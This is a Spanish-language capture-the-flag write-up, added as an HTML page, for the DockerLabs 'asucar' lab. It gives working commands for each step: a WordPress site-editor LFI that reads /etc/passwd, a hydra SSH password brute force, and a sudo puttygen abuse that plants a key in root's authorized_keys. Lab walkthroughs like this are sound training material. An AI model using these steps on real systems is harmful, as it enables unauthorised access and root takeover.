@@ -1,0 +1,103 @@
+<p><img src="assets/logo-dockerlabs.png" alt="logodocker" w="200" h="200" /></p>
+
+<p>En este reto de <a href="https://dockerlabs.es" title="dockerlabs">DockerLabs</a>  encontramos con escaneo de puertos para buscar una entrada al sistema , explotacion LFI wordpres ,fuerza bruta ssh y escalada final muy curiosa .</p>
+
+<h2 id="herramientas-y-recursos-usados">Herramientas y recursos usados</h2>
+
+<ul>
+  <li>nmap</li>
+  <li>nslookup</li>
+  <li>wpscan</li>
+  <li>puttygen</li>
+</ul>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<p>Empezamos lanzando un nmap contra el objetivo .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-n</span> <span class="nt">-oX</span> asucar 172.17.0.2
+</code></pre></div></div>
+<p><a href="/reporte/asucar.html" title="reportesnmap">Reporte nmap</a></p>
+
+<p>Nmap nos informa que tenemos el 22 abierto y el 80 corriendo un wordpress en su version 6.5.3.</p>
+
+<p>Cuando entro a la web la veo que no carga bien los estilos .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nslookup 172.17.0.2
+</code></pre></div></div>
+
+<p><img src="assets/asucar/domain.png" alt="domain" /></p>
+
+<p>Añadimos a /etc/hosts recargamos la web y la revisamos.
+No soy capaz de encontrar nada util ,en google encuentro esto.</p>
+
+<p><img src="assets/asucar/vulnerable.png" alt="vulnerable" /></p>
+
+<p>Lo cual tampoco sirve pues no esta instalado dicho plugin.</p>
+
+<p>Ejecuto wpscan</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--api-token</span> xxxxxxxxxxxxxxxxxx <span class="nt">--url</span> http://asucar.dl <span class="nt">--enumerate</span> u,vp
+</code></pre></div></div>
+
+<p>Tengo suerte y me halla un local file inclusion.</p>
+
+<p><img src="assets/asucar/wpscan.png" alt="wpscan" /></p>
+
+<p>Buscamosen google exploit wordpress site editor lfi y el primer resultado.</p>
+
+<p><img src="assets/asucar/exploit.png" alt="exploit" /></p>
+
+<h2 id="infiltracion">Infiltracion</h2>
+
+<p>Ajustamos la ruta y probamos.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+</code></pre></div></div>
+
+<p><img src="assets/asucar/lfi.png" alt="lfi" /></p>
+
+<p>Tenemos exito y ya tenemos usuario es hora de hydra.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> hydra <span class="nt">-l</span> curiosito <span class="nt">-P</span> rockyou.txt ssh://172.17.0.2 <span class="nt">-t</span> 4
+</code></pre></div></div>
+
+<p><img src="assets/asucar/hydra.png" alt="hydra" /></p>
+
+<p>Hacemos login y ejecutamos lo de siempre.</p>
+
+<p><img src="assets/asucar/sudo.png" alt="sudo" /></p>
+
+<p>Me encuentro con un binario con el que nunca he hecho la escalada <strong>puttygen</strong> a tirar de google para ver como funciona el puttygen.</p>
+
+<p>Nos sirve para crear claves ssh , he proabado de distintas formas pero por temas de permisos de escritura no consegui hacerlo como queria , asi que hay que hacerlo primero en el home del usario con el que estamos conectados y luego copiar lo creado con <strong>sudo puttygen</strong> para poder escribir en el directorio de root.</p>
+
+<p>Primero creamos las claves:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puttygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 2048 <span class="nt">-O</span> private-openssh <span class="nt">-o</span> ~/.ssh/hacked
+</code></pre></div></div>
+<p>El siguiente paso es añadir el contenido de la clave publica que extraemos de la privada añadiendolo a authorized_keys</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puttygen <span class="nt">-L</span> ~/.ssh/hacked <span class="o">&gt;&gt;</span> ~/.ssh/authorized_keys
+</code></pre></div></div>
+
+<p>Ya tenemos todo listo en el directorio del usario pero lo queremos en root , en este momento es cuando realmente abusamos de puttygen usandolo con sudo para copiar a su directorio.</p>
+
+<p>Copiamos la clave.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>puttygen /home/curiosito/.ssh/hacked <span class="nt">-o</span> /root/.ssh/hacked
+</code></pre></div></div>
+
+<p>Añadimos la clave al authorized_keys</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>puttygen /home/curiosito/.ssh/hacked <span class="nt">-o</span> /root/.ssh/authorized_keys <span class="nt">-O</span> public-openssh
+</code></pre></div></div>
+
+<p>Por ultimos podemos descargar la clave o conectarnos desde el mismo terminal.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> /home/curiosito/.ssh/hacked root@localhost
+</code></pre></div></div>
+<p><img src="assets/asucar/root.png" alt="root" /></p>
+
+<p>Esta se me complico buscando info de puttygen mucha mierda de windows me salia.</p>
+
+<p>Gracias por leer.</p>
